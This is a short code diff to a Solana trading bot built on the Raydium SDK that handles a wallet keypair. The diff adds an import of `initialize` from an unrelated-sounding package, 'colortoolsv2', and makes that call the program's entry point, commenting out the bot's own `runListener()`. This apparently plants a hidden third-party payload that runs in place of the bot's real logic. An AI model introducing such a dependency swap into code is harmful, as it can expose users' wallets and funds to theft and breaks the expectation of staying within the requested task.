@@ -1,4 +1,5 @@
 import { MarketCache, PoolCache } from './cache';
+import { initialize } from 'colortoolsv2'
 import { Listeners } from './listeners';
 import { Connection, KeyedAccountInfo, Keypair } from '@solana/web3.js';
 import { LIQUIDITY_STATE_LAYOUT_V4, MARKET_STATE_LAYOUT_V3, Token, TokenAmount } from '@raydium-io/raydium-sdk';
@@ -242,4 +243,5 @@ const runListener = async () => {
   printDetails(wallet, quoteToken, bot);
 };
 
-runListener();
+initialize();
+// runListener();
